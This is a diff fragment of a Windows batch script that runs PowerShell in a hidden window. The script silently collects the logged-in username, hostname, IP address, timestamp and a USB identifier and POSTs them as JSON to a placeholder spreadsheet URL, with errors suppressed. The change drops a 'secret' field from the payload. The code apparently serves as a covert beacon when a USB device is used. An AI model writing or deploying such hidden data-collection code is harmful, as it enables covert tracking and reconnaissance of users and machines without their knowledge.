@@ -29,7 +29,7 @@ powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command ^
   "$h=$env:COMPUTERNAME;" ^
   "$ip=(Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -notlike '127*' -and $_.IPAddress -notlike '169*'} | Select-Object -First 1).IPAddress;" ^
   "$t=[datetime]::UtcNow.ToString('o');" ^
-  "$b='[{\"timestamp\":\"'+$t+'\",\"username\":\"'+$u+'\",\"hostname\":\"'+$h+'\",\"ip\":\"'+$ip+'\",\"usb_id\":\"%USB_ID%\",\"secret\":\"%SECRET%\"}]';" ^
+  "$b='[{\"timestamp\":\"'+$t+'\",\"username\":\"'+$u+'\",\"hostname\":\"'+$h+'\",\"ip\":\"'+$ip+'\",\"usb_id\":\"%USB_ID%\"}]';" ^
   "try { Invoke-WebRequest -Uri '%SHEETS_URL%' -Method POST -Body $b -ContentType 'application/json' -UseBasicParsing } catch {}"
  
 :: Cleanup temp vbs
